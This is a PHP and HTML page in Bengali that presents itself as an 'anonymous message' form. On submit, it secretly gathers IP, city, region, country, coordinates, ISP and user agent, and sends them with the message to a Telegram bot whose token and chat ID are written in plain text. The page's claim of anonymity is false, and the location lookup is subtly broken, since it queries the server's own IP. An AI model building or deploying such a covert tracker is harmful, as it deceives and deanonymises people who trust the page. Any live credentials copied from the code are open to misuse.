<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $message = trim($_POST['pesan']);

    if (empty($message)) {
        die("বার্তা খালি হতে পারবে না!");
    }
    //working make by kilnet Distroyer 
    // ipinfo.io থেকে আইপি ও লোকেশন ডেটা সংগ্রহ
    $ipInfo = json_decode(file_get_contents("https://ipinfo.io/json"), true);

    $ip = $ipInfo['ip'] ?? 'Unknown';
    $city = $ipInfo['city'] ?? 'Unknown';
    $region = $ipInfo['region'] ?? 'Unknown';
    $country = $ipInfo['country'] ?? 'Unknown';
    
    // loc => "latitude,longitude"
    $loc = isset($ipInfo['loc']) ? explode(',', $ipInfo['loc']) : ['', ''];
    $latitude = $loc[0];
    $longitude = $loc[1];

    $org = $ipInfo['org'] ?? 'Unknown';

    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Telegram Token & Chat ID
    $botToken = "7990519407:AAH4e1ul_AcaMDWIUJgAO73dd0aiptd-0Ac"; // উদাহরণ: 123456789:ABCdEfGh...
    $chatId = "7605667127"; // উদাহরণ: 123456789 বা -100...

    // চূড়ান্ত বার্তা
    $text = <<<EOD
📩 নতুন বেনামী বার্তা:
💬 *বার্তা*: $message

🌍 *IP ঠিকানা*: $ip
🏙️ *শহর*: $city
🗺️ *অঞ্চল*: $region
🌐 *দেশ*: $country
📍 *মানচিত্র লিংক*: https://www.google.com/maps?q=$latitude,$longitude
🏢 *ISP/নেটওয়ার্ক*: $org
🖥️ *ডিভাইস*: $userAgent
EOD;

    // Telegram API-তে পাঠানো
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $payload = [
        "chat_id" => $chatId,
        "text" => $text,
        "parse_mode" => "Markdown"
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/json\r\n",
            'content' => json_encode($payload)
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result) {
        echo "<script>alert('আপনার বার্তা সফলভাবে পাঠানো হয়েছে 😎'); window.location.href='".$_SERVER['PHP_SELF']."';</script>";
    } else {
        echo "<script>alert('বার্তা পাঠাতে ব্যর্থ হয়েছে। পরে আবার চেষ্টা করুন।');</script>";
    }

    exit;
}
?>

<!-- HTML Part -->
<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <title>বেনামী বার্তা পাঠান</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #111;
      color: #fff;
      text-align: center;
      padding: 50px;
    }
    textarea {
      width: 90%;
      height: 120px;
      padding: 10px;
      font-size: 16px;
      border-radius: 10px;
      border: none;
    }
    button {
      margin-top: 20px;
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 8px;
      background-color: #e91e63;
      color: white;
      border: none;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>💬 বেনামী বার্তা পাঠান</h1>
  <p>আপনার বার্তাটি নিচে লিখুন এবং পাঠান!</p>
  <form method="post">
    <textarea name="pesan" placeholder="এখানে আপনার বার্তা লিখুন..."></textarea><br>
    <button type="submit">এখনই পাঠান</button>
  </form>
</body>
</html>